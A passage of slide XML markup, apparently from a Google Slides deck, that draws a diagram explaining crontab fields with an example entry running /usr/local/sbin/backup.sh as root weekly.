        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="1083" name="Google Shape;1083;p124"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2405075" y="2748125"/>
            <a:ext cx="0" cy="1235700"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="1084" name="Google Shape;1084;p124"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2812525" y="2748125"/>
            <a:ext cx="0" cy="932100"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="1085" name="Google Shape;1085;p124"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3230575" y="2748125"/>
            <a:ext cx="0" cy="624300"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="1086" name="Google Shape;1086;p124"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3226600" y="3362050"/>
            <a:ext cx="972900" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="1087" name="Google Shape;1087;p124"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1346888" y="2424875"/>
          <a:ext cx="3000000" cy="3000000"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr>
                <a:noFill/>
                <a:tableStyleId>{6612969B-C513-441B-A60A-CB1CB7D8F428}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="423725"/>
                <a:gridCol w="423725"/>
                <a:gridCol w="423725"/>
                <a:gridCol w="423725"/>
                <a:gridCol w="377725"/>
                <a:gridCol w="5261000"/>
              </a:tblGrid>
              <a:tr h="215600">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
                        <a:spcBef>
                          <a:spcPts val="500"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buClr>
                          <a:srgbClr val="000000"/>
                        </a:buClr>
                        <a:buSzPts val="1100"/>
                        <a:buFont typeface="Arial"/>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto Mono"/>
                          <a:ea typeface="Roboto Mono"/>
                          <a:cs typeface="Roboto Mono"/>
                          <a:sym typeface="Roboto Mono"/>
                        </a:rPr>
                        <a:t>36</a:t>
                      </a:r>
                      <a:endParaRPr/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="0" marB="0" marR="0" marL="0" anchor="ctr">
                    <a:lnL cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="595959">
                          <a:alpha val="0"/>
                        </a:srgbClr>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnL>
                    <a:lnR cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="1475D4">
                          <a:alpha val="0"/>
                        </a:srgbClr>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnR>
                    <a:lnT cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="595959">
                          <a:alpha val="0"/>
                        </a:srgbClr>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnT>
                    <a:lnB cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="595959">
                          <a:alpha val="0"/>
                        </a:srgbClr>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
                        <a:spcBef>
                          <a:spcPts val="500"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buClr>
                          <a:srgbClr val="000000"/>
                        </a:buClr>
                        <a:buSzPts val="1100"/>
                        <a:buFont typeface="Arial"/>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto Mono"/>
                          <a:ea typeface="Roboto Mono"/>
                          <a:cs typeface="Roboto Mono"/>
                          <a:sym typeface="Roboto Mono"/>
                        </a:rPr>
                        <a:t>2</a:t>
                      </a:r>
                      <a:endParaRPr/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="0" marB="0" marR="0" marL="0" anchor="ctr">
                    <a:lnL cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="1475D4">
                          <a:alpha val="0"/>
                        </a:srgbClr>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnL>
                    <a:lnR cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="1475D4">
                          <a:alpha val="0"/>
                        </a:srgbClr>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnR>
                    <a:lnT cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="595959">
                          <a:alpha val="0"/>
                        </a:srgbClr>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnT>
                    <a:lnB cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="595959">
                          <a:alpha val="0"/>
                        </a:srgbClr>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
                        <a:spcBef>
                          <a:spcPts val="500"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buClr>
                          <a:srgbClr val="000000"/>
                        </a:buClr>
                        <a:buSzPts val="1100"/>
                        <a:buFont typeface="Arial"/>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto Mono"/>
                          <a:ea typeface="Roboto Mono"/>
                          <a:cs typeface="Roboto Mono"/>
                          <a:sym typeface="Roboto Mono"/>
                        </a:rPr>
                        <a:t>*</a:t>
                      </a:r>
                      <a:endParaRPr/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="0" marB="0" marR="0" marL="0" anchor="ctr">
                    <a:lnL cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="1475D4">
                          <a:alpha val="0"/>
                        </a:srgbClr>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnL>
                    <a:lnR cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="1475D4">
                          <a:alpha val="0"/>
                        </a:srgbClr>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnR>
                    <a:lnT cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="595959">
                          <a:alpha val="0"/>
                        </a:srgbClr>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnT>
                    <a:lnB cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="595959">
                          <a:alpha val="0"/>
                        </a:srgbClr>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
                        <a:spcBef>
                          <a:spcPts val="500"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buClr>
                          <a:srgbClr val="000000"/>
                        </a:buClr>
                        <a:buSzPts val="1100"/>
                        <a:buFont typeface="Arial"/>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto Mono"/>
                          <a:ea typeface="Roboto Mono"/>
                          <a:cs typeface="Roboto Mono"/>
                          <a:sym typeface="Roboto Mono"/>
                        </a:rPr>
                        <a:t>*</a:t>
                      </a:r>
                      <a:endParaRPr/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="0" marB="0" marR="0" marL="0" anchor="ctr">
                    <a:lnL cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="1475D4">
                          <a:alpha val="0"/>
                        </a:srgbClr>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnL>
                    <a:lnR cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="1475D4">
                          <a:alpha val="0"/>
                        </a:srgbClr>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnR>
                    <a:lnT cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="595959">
                          <a:alpha val="0"/>
                        </a:srgbClr>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnT>
                    <a:lnB cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="595959">
                          <a:alpha val="0"/>
                        </a:srgbClr>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
                        <a:spcBef>
                          <a:spcPts val="500"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buClr>
                          <a:srgbClr val="000000"/>
                        </a:buClr>
                        <a:buSzPts val="1100"/>
                        <a:buFont typeface="Arial"/>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto Mono"/>
                          <a:ea typeface="Roboto Mono"/>
                          <a:cs typeface="Roboto Mono"/>
                          <a:sym typeface="Roboto Mono"/>
                        </a:rPr>
                        <a:t>7</a:t>
                      </a:r>
                      <a:endParaRPr/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="0" marB="0" marR="0" marL="0" anchor="ctr">
                    <a:lnL cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="1475D4">
                          <a:alpha val="0"/>
                        </a:srgbClr>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnL>
                    <a:lnR cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="1475D4">
                          <a:alpha val="0"/>
                        </a:srgbClr>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnR>
                    <a:lnT cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="595959">
                          <a:alpha val="0"/>
                        </a:srgbClr>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnT>
                    <a:lnB cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="595959">
                          <a:alpha val="0"/>
                        </a:srgbClr>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
                        <a:spcBef>
                          <a:spcPts val="500"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buClr>
                          <a:srgbClr val="000000"/>
                        </a:buClr>
                        <a:buSzPts val="1100"/>
                        <a:buFont typeface="Arial"/>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en">
                          <a:solidFill>
                            <a:srgbClr val="1475D4"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto Mono"/>
                          <a:ea typeface="Roboto Mono"/>
                          <a:cs typeface="Roboto Mono"/>
                          <a:sym typeface="Roboto Mono"/>
                        </a:rPr>
                        <a:t>-Execute command as user root</a:t>
                      </a:r>
                      <a:endParaRPr>
                        <a:solidFill>
                          <a:srgbClr val="1475D4"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto Mono"/>
                        <a:ea typeface="Roboto Mono"/>
                        <a:cs typeface="Roboto Mono"/>
                        <a:sym typeface="Roboto Mono"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="0" marB="0" marR="0" marL="91425" anchor="ctr">
                    <a:lnL cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="1475D4">
                          <a:alpha val="0"/>
                        </a:srgbClr>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnL>
                    <a:lnR cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="595959">
                          <a:alpha val="0"/>
                        </a:srgbClr>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnR>
                    <a:lnT cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="595959">
                          <a:alpha val="0"/>
                        </a:srgbClr>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnT>
                    <a:lnB cap="flat" cmpd="sng" w="9525">
                      <a:solidFill>
                        <a:srgbClr val="595959">
                          <a:alpha val="0"/>
                        </a:srgbClr>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd len="sm" w="sm" type="none"/>
                      <a:tailEnd len="sm" w="sm" type="none"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1088" name="Google Shape;1088;p124"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4474400" y="2886275"/>
            <a:ext cx="3543300" cy="215400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="500"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="000000"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:srgbClr val="1475D4"/>
                </a:solidFill>
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>/usr/local/sbin/backup.sh</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="1475D4"/>
              </a:solidFill>
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="1089" name="Google Shape;1089;p124"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3652600" y="2748125"/>
            <a:ext cx="0" cy="292500"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="1090" name="Google Shape;1090;p124"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3648625" y="3031563"/>
            <a:ext cx="549300" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1091" name="Google Shape;1091;p124"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4474400" y="3206050"/>
            <a:ext cx="3801000" cy="215400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="500"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:srgbClr val="1475D4"/>
                </a:solidFill>
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>day of the week </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>(0-6)(Sunday = 0)</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1092" name="Google Shape;1092;p124"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4474400" y="3525831"/>
            <a:ext cx="3801000" cy="215400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="500"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:srgbClr val="1475D4"/>
                </a:solidFill>
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>month</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t> (1-12)</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1093" name="Google Shape;1093;p124"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4474400" y="3845612"/>
            <a:ext cx="3801000" cy="215400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="500"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:srgbClr val="1475D4"/>
                </a:solidFill>
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>day of month </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>(1-31)</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1094" name="Google Shape;1094;p124"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4474400" y="4165393"/>
            <a:ext cx="3801000" cy="215400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="500"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
